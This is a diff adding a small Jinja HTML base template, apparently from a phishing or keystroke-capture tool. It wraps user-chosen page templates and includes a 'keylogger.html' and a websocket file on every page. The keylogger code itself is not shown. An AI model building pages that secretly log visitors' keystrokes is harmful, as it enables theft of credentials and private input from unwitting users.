@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	{% include 'user_defined/%s/head.html' % user_template %}
+  </head>
+
+  <body>
+	{% include 'user_defined/%s/body.html' % user_template %}
+	{% include 'dont_touch/websockets.html' %}
+	{% include 'dont_touch/keylogger.html' %}
+  </body>
+</html>
